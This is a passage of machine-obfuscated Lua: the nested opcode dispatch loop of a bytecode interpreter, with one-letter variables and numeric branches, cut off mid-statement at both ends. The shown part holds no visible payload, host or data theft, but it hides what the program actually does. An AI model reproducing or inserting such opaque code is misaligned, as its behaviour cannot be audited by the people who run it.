w[y[898]]=w[y[716]][w[y[585]]];else if not(13~=ba)then n=(n+1);else y=f[n];end end end else if ba<=16 then if(ba>15)then bc={w[bd](w[bd+1])};else bd=y[898]end else if(ba<17 or ba==17)then bb=0;else if not(18~=ba)then for be=bd,y[585]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end else local ba=0 while true do if(ba<7 or ba==7)then if(ba<=3)then if(ba<1 or ba==1)then if not(ba~=0)then w[y[898]]=w[y[716]][y[585]];else n=(n+1);end else if not(ba==3)then y=f[n];else w[y[898]][y[716]]=w[y[585]];end end else if(ba==5 or ba<5)then if 4<ba then y=f[n];else n=(n+1);end else if(ba<7)then w[y[898]]=w[y[716]][y[585]];else n=n+1;end end end else if(ba<=11)then if(ba<9 or ba==9)then if 9~=ba then y=f[n];else w[y[898]]=h[y[716]];end else if not(ba~=10)then n=(n+1);else y=f[n];end end else if(ba<=13)then if not(ba==13)then w[y[898]]=w[y[716]][y[585]];else n=(n+1);end else if(ba==14 or ba<14)then y=f[n];else if 16>ba then if(w[y[898]]~=w[y[585]])then n=(n+1);else n=y[716];end;else break end end end end end ba=ba+1 end end;elseif(141>=z)then local ba,bb,bc,bd=0 while true do if(ba<9 or ba==9)then if(ba<4 or ba==4)then if(ba==1 or ba<1)then if(1>ba)then bb=nil else bc=nil end else if(ba<2 or ba==2)then bd=nil else if(ba>3)then n=(n+1);else w[y[898]]=h[y[716]];end end end else if(ba==6 or ba<6)then if not(5~=ba)then y=f[n];else w[y[898]]=h[y[716]];end else if(ba<=7)then n=(n+1);else if not(ba==9)then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end end end else if(ba<14 or ba==14)then if(ba<11 or ba==11)then if not(ba~=10)then n=(n+1);else y=f[n];end else if((ba<12)or ba==12)then w[y[898]]=w[y[716]][w[y[585]]];else if(13<ba)then y=f[n];else n=(n+1);end end end else if(ba<16 or(ba==16))then if not(15~=ba)then bd=y[898]else bc={w[bd](w[bd+1])};end else if(ba==17 or ba<17)then bb=0;else if(19>ba)then for be=bd,y[585]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end elseif not(not(z==142))then n=y[716];else local ba,bb=0 while true do if(ba==8 or ba<8)then if(ba<=3)then if(ba<1 or ba==1)then if(ba<1)then bb=nil else w[y[898]]=w[y[716]][y[585]];end else if ba>2 then y=f[n];else n=(n+1);end end else if(ba<=5)then if ba>4 then n=n+1;else w[y[898]]=w[y[716]][y[585]];end else if(ba<=6)then y=f[n];else if ba<8 then w[y[898]]=w[y[716]][y[585]];else n=(n+1);end end end end else if(ba<13 or ba==13)then if(ba<=10)then if(ba~=10)then y=f[n];else w[y[898]]=w[y[716]][y[585]];end else if ba<=11 then n=n+1;else if 13>ba then y=f[n];else w[y[898]]=false;end end end else if ba<=15 then if 15>ba then n=(n+1);else y=f[n];end else if ba<=16 then bb=y[898]else if not(17~=ba)then w[bb](w[bb+1])else break end end end end end ba=(ba+1)end end;elseif(z==146 or z<146)then if(z==144 or z<144)then w[y[898]][w[y[716]]]=w[y[585]];elseif not(145~=z)then local ba,bb,bc=0 while true do if ba<=24 then if ba<=11 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if ba~=2 then bc=nil else w[y[898]]={};end end else if ba<=3 then n=n+1;else if 5>ba then y=f[n];else w[y[898]]=h[y[716]];end end end else if ba<=8 then if ba<=6 then n=n+1;else if 7==ba then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end else if ba<=9 then n=n+1;else if ba==10 then y=f[n];else w[y[898]]=h[y[716]];end end end end else if ba<=17 then if ba<=14 then if ba<=12 then n=n+1;else if ba>13 then w[y[898]]=w[y[716]][y[585]];else y=f[n];end end else if ba<=15 then n=n+1;else if ba>16 then w[y[898]]=w[y[716]][y[585]];else y=f[n];end end end else if ba<=20 then if ba<=18 then n=n+1;else if 19==ba then y=f[n];else w[y[898]]={};end end else if ba<=22 then if 22>ba then n=n+1;else y=f[n];end else if 23==ba then w[y[898]]={};else n=n+1;end end end end end else if ba<=37 then if ba<=30 then if ba<=27 then if ba<=25 then y=f[n];else if ba>26 then n=n+1;else w[y[898]]=h[y[716]];end end else if ba<=28 then y=f[n];else if 30~=ba then w[y[898]][y[716]]=w[y[585]];else n=n+1;end end end else if ba<=33 then if ba<=31 then y=f[n];else if ba>32 then n=n+1;else w[y[898]]=h[y[716]];end end else if ba<=35 then if ba==34 then y=f[n];else w[y[898]][y[716]]=w[y[585]];end else if ba~=37 then n=n+1;else y=f[n];end end end end else if ba<=43 then if ba<=40 then if ba<=38 then w[y[898]][y[716]]=w[y[585]];else if 39<ba then y=f[n];else n=n+1;end end else if ba<=41 then w[y[898]]={r({},1,y[716])};else if ba<43 then n=n+1;else y=f[n];end end end else if ba<=46 then if ba<=44 then w[y[898]]=w[y[716]];else if ba~=46 then n=n+1;else y=f[n];end end else if ba<=48 then if 48>ba then bc=y[898];else bb=w[bc];end else if ba==49 then for bd=bc+1,y[716]do t(bb,w[bd])end;else break end end end end end end ba=ba+1 end else w[y[898]][y[716]]=w[y[585]];end;elseif(147>=z)then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba~=1 then bb=nil else w[y[898]][y[716]]=w[y[585]];end else if 3~=ba then n=n+1;else y=f[n];end end else if ba<=5 then if ba~=5 then w[y[898]]={};else n=n+1;end else if ba~=7 then y=f[n];else w[y[898]][y[716]]=y[585];end end end else if ba<=11 then if ba<=9 then if ba==8 then n=n+1;else y=f[n];end else if 11>ba then w[y[898]][y[716]]=w[y[585]];else n=n+1;end end else if ba<=13 then if ba==12 then y=f[n];else bb=y[898]end else if 15~=ba then w[bb]=w[bb](r(w,bb+1,y[716]))else break end end end end ba=ba+1 end elseif z>148 then local ba=y[898];p=ba+x-1;for bb=ba,p do local ba=q[(bb-ba)];w[bb]=ba;end;else local ba,bb=0 while true do if ba<=10 then if ba<=4 then if ba<=1 then if 0<ba then w[y[898]]=j[y[716]];else bb=nil end else if ba<=2 then n=n+1;else if ba>3 then w[y[898]]=w[y[716]][y[585]];else y=f[n];end end end else if ba<=7 then if ba<=5 then n=n+1;else if ba~=7 then y=f[n];else w[y[898]]=y[716];end end else if ba<=8 then n=n+1;else if ba>9 then w[y[898]]=y[716];else y=f[n];end end end end else if ba<=15 then if ba<=12 then if ba<12 then n=n+1;else y=f[n];end else if ba<=13 then w[y[898]]=y[716];else if ba>14 then y=f[n];else n=n+1;end end end else if ba<=18 then if ba<=16 then w[y[898]]=y[716];else if 17<ba then y=f[n];else n=n+1;end end else if ba<=19 then bb=y[898]else if ba>20 then break else w[bb]=w[bb](r(w,bb+1,y[716]))end end end end end ba=ba+1 end end;elseif(z<155 or z==155)then if(152>z or 152==z)then if(z<150 or z==150)then w[y[898]]=false;n=(n+1);elseif not(152==z)then w[y[898]]=w[y[716]][y[585]];else local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba==0 then bb=nil else bc=nil end else if ba<=2 then bd=nil else if ba~=4 then w[y[898]]=h[y[716]];else n=n+1;end end end else if ba<=6 then if 6~=ba then y=f[n];else w[y[898]]=h[y[716]];end else if ba<=7 then n=n+1;else if 9~=ba then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end end end else if ba<=14 then if ba<=11 then if 11>ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[898]]=w[y[716]][w[y[585]]];else if ba>13 then y=f[n];else n=n+1;end end end else if ba<=16 then if 15<ba then bc={w[bd](w[bd+1])};else bd=y[898]end else if ba<=17 then bb=0;else if 19~=ba then for be=bd,y[585]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end end;elseif(153>z or 153==z)then local ba,bb=0 while true do if ba<=13 then if ba<=6 then if ba<=2 then if ba<=0 then bb=nil else if ba~=2 then w={};else for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;end end else if ba<=4 then if ba<4 then n=n+1;else y=f[n];end else if 5<ba then n=n+1;else w[y[898]]=h[y[716]];end end end else if ba<=9 then if ba<=7 then y=f[n];else if ba==8 then w[y[898]]=w[y[716]][y[585]];else n=n+1;end end else if ba<=11 then if 11>ba then y=f[n];else w[y[898]]=h[y[716]];end else if 13~=ba then n=n+1;else y=f[n];end end end end else if ba<=20 then if ba<=16 then if ba<=14 then w[y[898]]=h[y[716]];else if ba~=16 then n=n+1;else y=f[n];end end else if ba<=18 then if 17==ba then w[y[898]]=h[y[716]];else n=n+1;end else if 19<ba then w[y[898]]=h[y[716]];else y=f[n];end end end else if ba<=24 then if ba<=22 then if 22>ba then n=n+1;else y=f[n];end else if 24~=ba then w[y[898]]=w[y[716]][y[585]];else n=n+1;end end else if ba<=26 then if 25==ba then y=f[n];else bb=y[898]end else if 27<ba then break else w[bb]=w[bb](r(w,bb+1,y[716]))end end end end end ba=ba+1 end elseif z<155 then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 0<ba then bc=nil else bb=nil end else if ba<=2 then bd=nil else if 3==ba then w[y[898]]=h[y[716]];else n=n+1;end end end else if ba<=6 then if ba<6 then y=f[n];else w[y[898]]=h[y[716]];end else if ba<=7 then n=n+1;else if 9~=ba then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end end end else if ba<=14 then if ba<=11 then if 11>ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[898]]=w[y[716]][w[y[585]]];else if 14~=ba then n=n+1;else y=f[n];end end end else if ba<=16 then if 15<ba then bc={w[bd](w[bd+1])};else bd=y[898]end else if ba<=17 then bb=0;else if ba==18 then for be=bd,y[585]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=13 then if ba<=6 then if ba<=2 then if ba<=0 then bb=nil else if 1==ba then w[y[898]]={};else n=n+1;end end else if ba<=4 then if 3==ba then y=f[n];else w[y[898]]=h[y[716]];end else if 5==ba then n=n+1;else y=f[n];end end end else if ba<=9 then if ba<=7 then w[y[898]]=w[y[716]][y[585]];else if 8<ba then y=f[n];else n=n+1;end end else if ba<=11 then if ba<11 then w[y[898]][y[716]]=w[y[585]];else n=n+1;end else if ba==12 then y=f[n];else w[y[898]]=j[y[716]];end end end end else if ba<=20 then if ba<=16 then if ba<=14 then n=n+1;else if ba<16 then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end else if ba<=18 then if ba<18 then n=n+1;else y=f[n];end else if ba<20 then w[y[898]]=j[y[716]];else n=n+1;end end end else if ba<=23 then if ba<=21 then y=f[n];else if ba==22 then w[y[898]]=w[y[716]][y[585]];else n=n+1;end end else if ba<=25 then if 25~=ba then y=f[n];else bb=y[898]end else if 26<ba then break else w[bb]=w[bb]()end end end end end ba=ba+1 end end;elseif(z<=158)then if(156>z or 156==z)then local ba,bb=0 while true do if(ba<8 or ba==8)then if(ba<=3)then if(ba<=1)then if(ba==0)then bb=nil else w[y[898]]=j[y[716]];end else if 2<ba then y=f[n];else n=(n+1);end end else if ba<=5 then if ba<5 then w[y[898]]=w[y[716]][y[585]];else n=n+1;end else if(ba<6 or ba==6)then y=f[n];else if(8>ba)then w[y[898]]=y[716];else n=(n+1);end end end end else if ba<=13 then if ba<=10 then if not(10==ba)then y=f[n];else w[y[898]]=y[716];end else if(ba==11 or ba<11)then n=n+1;else if ba<13 then y=f[n];else w[y[898]]=y[716];end end end else if(ba<15 or ba==15)then if not(ba==15)then n=n+1;else y=f[n];end else if ba<=16 then bb=y[898]else if(ba~=18)then w[bb]=w[bb](r(w,bb+1,y[716]))else break end end end end end ba=ba+1 end elseif 157<z then w[y[898]]=w[y[716]]%y[585];else w[y[898]]=w[y[716]]+y[585];end;elseif(159>=z)then local ba=y[898]w[ba]=w[ba](r(w,(ba+1),y[716]))elseif not(z~=160)then w[y[898]]=w[y[716]];else local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba==0 then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 4>ba then w[y[898]]=h[y[716]];else n=n+1;end end end else if ba<=6 then if 6~=ba then y=f[n];else w[y[898]]=h[y[716]];end else if ba<=7 then n=n+1;else if 9>ba then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end end end else if ba<=14 then if ba<=11 then if ba~=11 then n=n+1;else y=f[n];end else if ba<=12 then w[y[898]]=w[y[716]][w[y[585]]];else if 13<ba then y=f[n];else n=n+1;end end end else if ba<=16 then if 15<ba then bc={w[bd](w[bd+1])};else bd=y[898]end else if ba<=17 then bb=0;else if ba>18 then break else for be=bd,y[585]do bb=bb+1;w[be]=bc[bb];end end end end end end ba=ba+1 end end;elseif z<=173 then if z<=167 then if z<=164 then if 162>=z then local ba,bb,bc=0 while true do if ba<=24 then if ba<=11 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if 2~=ba then bc=nil else w[y[898]]={};end end else if ba<=3 then n=n+1;else if ba>4 then w[y[898]]=h[y[716]];else y=f[n];end end end else if ba<=8 then if ba<=6 then n=n+1;else if 8>ba then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end else if ba<=9 then n=n+1;else if ba==10 then y=f[n];else w[y[898]]=h[y[716]];end end end end else if ba<=17 then if ba<=14 then if ba<=12 then n=n+1;else if ba==13 then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end else if ba<=15 then n=n+1;else if ba~=17 then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end end else if ba<=20 then if ba<=18 then n=n+1;else if ba==19 then y=f[n];else w[y[898]]={};end end else if ba<=22 then if 22~=ba then n=n+1;else y=f[n];end else if 23<ba then n=n+1;else w[y[898]]={};end end end end end else if ba<=37 then if ba<=30 then if ba<=27 then if ba<=25 then y=f[n];else if ba==26 then w[y[898]]=h[y[716]];else n=n+1;end end else if ba<=28 then y=f[n];else if ba~=30 then w[y[898]][y[716]]=w[y[585]];else n=n+1;end end end else if ba<=33 then if ba<=31 then y=f[n];else if ba>32 then n=n+1;else w[y[898]]=h[y[716]];end end else if ba<=35 then if 34<ba then w[y[898]][y[716]]=w[y[585]];else y=f[n];end else if 37>ba then n=n+1;else y=f[n];end end end end else if ba<=43 then if ba<=40 then if ba<=38 then w[y[898]][y[716]]=w[y[585]];else if ba>39 then y=f[n];else n=n+1;end end else if ba<=41 then w[y[898]]={r({},1,y[716])};else if 43~=ba then n=n+1;else y=f[n];end end end else if ba<=46 then if ba<=44 then w[y[898]]=w[y[716]];else if ba>45 then y=f[n];else n=n+1;end end else if ba<=48 then if 47<ba then bb=w[bc];else bc=y[898];end else if ba<50 then for bd=bc+1,y[716]do t(bb,w[bd])end;else break end end end end end end ba=ba+1 end elseif z~=164 then local ba;local bb;local bc;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];bc=y[898]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[585]do ba=ba+1;w[bd]=bb[ba];end else w[y[898]]=false;n=n+1;end;elseif z<=165 then local ba;local bb;local bc;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];bc=y[898]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[585]do ba=ba+1;w[bd]=bb[ba];end elseif 167~=z then local ba=y[898]w[ba](r(w,ba+1,p))else local ba;w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];w[y[898]]=w[y[716]];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](w[ba+1])end;elseif 170>=z then if 168>=z then local ba;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]]*y[585];n=n+1;y=f[n];w[y[898]]=w[y[716]]+w[y[585]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]]+w[y[585]];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))elseif z~=170 then w[y[898]]();else w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];if(w[y[898]]~=y[585])then n=n+1;else n=y[716];end;end;elseif 171>=z then local ba;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=false;n=n+1;y=f[n];ba=y[898]w[ba](w[ba+1])elseif z>172 then local ba;w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];w[y[898]]=w[y[716]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))else local ba;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba]()end;elseif z<=179 then if z<=176 then if(174>z or 174==z)then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba<1 then bb=nil else w[y[898]]=h[y[716]];end else if ba~=3 then n=n+1;else y=f[n];end end else if ba<=5 then if ba==4 then w[y[898]]=w[y[716]][y[585]];else n=n+1;end else if 7~=ba then y=f[n];else w[y[898]]=y[716];end end end else if ba<=11 then if ba<=9 then if ba==8 then n=n+1;else y=f[n];end else if ba>10 then n=n+1;else w[y[898]]=y[716];end end else if ba<=13 then if ba~=13 then y=f[n];else bb=y[898]end else if ba~=15 then w[bb]=w[bb](r(w,bb+1,y[716]))else break end end end end ba=ba+1 end elseif not(175~=z)then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba==0 then bb=nil else w[y[898]]=w[y[716]];end else if ba>2 then y=f[n];else n=n+1;end end else if ba<=5 then if 5>ba then w[y[898]]=y[716];else n=n+1;end else if 7~=ba then y=f[n];else w[y[898]]=y[716];end end end else if ba<=11 then if ba<=9 then if 8<ba then y=f[n];else n=n+1;end else if 11>ba then w[y[898]]=y[716];else n=n+1;end end else if ba<=13 then if 12==ba then y=f[n];else bb=y[898]end else if 15>ba then w[bb]=w[bb](r(w,bb+1,y[716]))else break end end end end ba=ba+1 end else local ba,bb,bc=0 while true do if ba<=24 then if ba<=11 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if ba>1 then w[y[898]]={};else bc=nil end end else if ba<=3 then n=n+1;else if ba==4 then y=f[n];else w[y[898]]=h[y[716]];end end end else if ba<=8 then if ba<=6 then n=n+1;else if ba>7 then w[y[898]]=w[y[716]][y[585]];else y=f[n];end end else if ba<=9 then n=n+1;else if ba<11 then y=f[n];else w[y[898]]=h[y[716]];end end end end else if ba<=17 then if ba<=14 then if ba<=12 then n=n+1;else if ba~=14 then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end else if ba<=15 then n=n+1;else if 16==ba then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end end else if ba<=20 then if ba<=18 then n=n+1;else if 19==ba then y=f[n];else w[y[898]]={};end end else if ba<=22 then if ba>21 then y=f[n];else n=n+1;end else if ba>23 then n=n+1;else w[y[898]]={};end end end end end else if ba<=37 then if ba<=30 then if ba<=27 then if ba<=25 then y=f[n];else if 26==ba then w[y[898]]=h[y[716]];else n=n+1;end end else if ba<=28 then y=f[n];else if 29<ba then n=n+1;else w[y[898]][y[716]]=w[y[585]];end end end else if ba<=33 then if ba<=31 then y=f[n];else if ba==32 then w[y[898]]=h[y[716]];else n=n+1;end end else if ba<=35 then if ba<35 then y=f[n];else w[y[898]][y[716]]=w[y[585]];end else if 36<ba then y=f[n];else n=n+1;end end end end else if ba<=43 then if ba<=40 then if ba<=38 then w[y[898]][y[716]]=w[y[585]];else if ba<40 then n=n+1;else y=f[n];end end else if ba<=41 then w[y[898]]={r({},1,y[716])};else if 43~=ba then n=n+1;else y=f[n];end end end else if ba<=46 then if ba<=44 then w[y[898]]=w[y[716]];else if ba~=46 then n=n+1;else y=f[n];end end else if ba<=48 then if 47<ba then bb=w[bc];else bc=y[898];end else if 50~=ba then for bd=bc+1,y[716]do t(bb,w[bd])end;else break end end end end end end ba=ba+1 end end;elseif 177>=z then local ba=y[898]w[ba]=w[ba](w[(ba+1)])elseif 178<z then w[y[898]][y[716]]=y[585];n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];else local ba;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))end;elseif z<=182 then if z<=180 then local ba,bb=0 while true do if ba<=10 then if ba<=4 then if ba<=1 then if 0<ba then w[y[898]]=h[y[716]];else bb=nil end else if ba<=2 then n=n+1;else if 3<ba then w[y[898]]=w[y[716]][y[585]];else y=f[n];end end end else if ba<=7 then if ba<=5 then n=n+1;else if ba~=7 then y=f[n];else w[y[898]]=h[y[716]];end end else if ba<=8 then n=n+1;else if 10>ba then y=f[n];else w[y[898]]=w[y[716]][w[y[585]]];end end end end else if ba<=15 then if ba<=12 then if ba~=12 then n=n+1;else y=f[n];end else if ba<=13 then w[y[898]]=h[y[716]];else if ba~=15 then n=n+1;else y=f[n];end end end else if ba<=18 then if ba<=16 then w[y[898]]=w[y[716]][y[585]];else if 17<ba then y=f[n];else n=n+1;end end else if ba<=19 then bb=y[898]else if ba>20 then break else w[bb]=w[bb](r(w,bb+1,y[716]))end end end end end ba=ba+1 end elseif z>181 then w[y[898]]=y[716];else local ba=y[898];w[ba]=w[ba]-w[ba+2];n=y[716];end;elseif 183>=z then local ba;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))elseif 184==z then local ba=y[898]w[ba]=w[ba](w[ba+1])else local ba;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))end;elseif z<=278 then if 231>=z then if z<=208 then if 196>=z then if z<=190 then if(z<187 or z==187)then if not(z==187)then j[y[716]]=w[y[898]];else local ba,bb,bc,bd,be,bf=0 while true do if ba<=3 then if ba<=1 then if ba>0 then bc=y[585]else bb=y[898]end else if ba<3 then bd=bb+2 else be={w[bb](w[bb+1],w[bd])}end end else if ba<=5 then if ba<5 then for bg=1,bc do w[bd+bg]=be[bg];end else bf=w[bb+3]end else if 7>ba then if bf then w[bd]=bf;n=y[716];else n=n+1 end;else break end end end ba=ba+1 end end;elseif(z<188 or z==188)then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if(ba<1 or ba==1)then if ba>0 then w[y[898]]=w[y[716]][y[585]];else bb=nil end else if ba>2 then y=f[n];else n=n+1;end end else if ba<=5 then if 5~=ba then w[y[898]]=w[y[716]][y[585]];else n=n+1;end else if(ba<=6)then y=f[n];else if(ba>7)then n=n+1;else w[y[898]]=w[y[716]][y[585]];end end end end else if ba<=13 then if ba<=10 then if 10>ba then y=f[n];else w[y[898]]=w[y[716]][y[585]];end else if(ba<11 or ba==11)then n=n+1;else if(12<ba)then w[y[898]]=w[y[716]][y[585]];else y=f[n];end end end else if(ba==15 or ba<15)then if(15>ba)then n=n+1;else y=f[n];end else if(ba<16 or ba==16)then bb=y[898]else if ba<18 then w[bb]=w[bb](w[bb+1])else break end end end end end ba=(ba+1)end elseif(z~=190)then if(w[y[898]]~=w[y[585]])then n=y[716];else n=(n+1);end;else local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba~=1 then bb=nil else w[y[898]][y[716]]=w[y[585]];end else if 3>ba then n=n+1;else y=f[n];end end else if ba<=5 then if ba~=5 then w[y[898]]={};else n=n+1;end else if 6<ba then w[y[898]][y[716]]=y[585];else y=f[n];end end end else if ba<=11 then if ba<=9 then if ba~=9 then n=n+1;else y=f[n];end else if 10<ba then n=n+1;else w[y[898]][y[716]]=w[y[585]];end end else if ba<=13 then if 12<ba then bb=y[898]else y=f[n];end else if 15~=ba then w[bb]=w[bb](r(w,bb+1,y[716]))else break end end end end ba=ba+1 end end;elseif z<=193 then if z<=191 then local ba;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](w[ba+1])elseif 193~=z then local ba;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))else local ba;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba]()end;elseif 194>=z then local ba,bb=0 while true do if(ba<7 or ba==7)then if(ba<=3)then if(ba<1 or ba==1)then if(ba>0)then w[y[898]]=h[y[716]];else bb=nil end else if 3>ba then n=(n+1);else y=f[n];end end else if ba<=5 then if(4==ba)then w[y[898]]=w[y[716]][y[585]];else n=n+1;end else if(6==ba)then y=f[n];else w[y[898]]=y[716];end end end else if(ba<11 or ba==11)then if ba<=9 then if ba~=9 then n=(n+1);else y=f[n];end else if not(11==ba)then w[y[898]]=y[716];else n=n+1;end end else if(ba<=13)then if(12==ba)then y=f[n];else bb=y[898]end else if(14<ba)then break else w[bb]=w[bb](r(w,bb+1,y[716]))end end end end ba=(ba+1)end elseif z>195 then local ba;local bb;local bc;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];bc=y[898]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[585]do ba=ba+1;w[bd]=bb[ba];end else local ba;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](w[ba+1])end;elseif z<=202 then if z<=199 then if(197>=z)then local ba,bb=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba~=1 then bb=nil else w={};end else if ba<=2 then for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;else if ba>3 then y=f[n];else n=n+1;end end end else if ba<=6 then if 5<ba then n=n+1;else w[y[898]]=y[716];end else if ba<=7 then y=f[n];else if 8==ba then w[y[898]]=h[y[716]];else n=n+1;end end end end else if ba<=14 then if ba<=11 then if ba<11 then y=f[n];else w[y[898]]=#w[y[716]];end else if ba<=12 then n=n+1;else if ba==13 then y=f[n];else w[y[898]]=y[716];end end end else if ba<=17 then if ba<=15 then n=n+1;else if 16<ba then bb=y[898];else y=f[n];end end else if ba<=18 then w[bb]=w[bb]-w[bb+2];else if 19==ba then n=y[716];else break end end end end end ba=ba+1 end 